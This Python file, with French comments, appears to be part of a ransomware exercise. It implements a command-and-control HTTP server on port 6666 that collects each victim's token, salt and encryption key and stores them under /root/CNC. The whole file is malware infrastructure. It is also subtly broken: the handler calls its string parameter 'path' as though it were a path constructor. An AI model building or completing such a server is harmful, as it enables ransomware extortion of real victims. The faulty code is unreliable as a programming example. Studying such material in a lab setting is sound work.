import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path: str, params: dict, body: dict) -> dict:
        # Récupérer les données du sel, de la clé et du token à partir du corps de la requête
        token = body["token"]
        salt = body["salt"]
        key = body["key"]

        # Créer un répertoire pour stocker les données du sel et de la clé
        token_directory = path(self.ROOT_PATH) / token
        token_directory.mkdir(parents=True, exist_ok=True)

        # Sauvegarder le sel et la clé dans des fichiers séparés
        self.save_b64(token, salt, "salt")
        self.save_b64(token, key, "key")

        # Retourner un dictionnaire indiquant le succès de l'opération
        return {"status": "OK"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()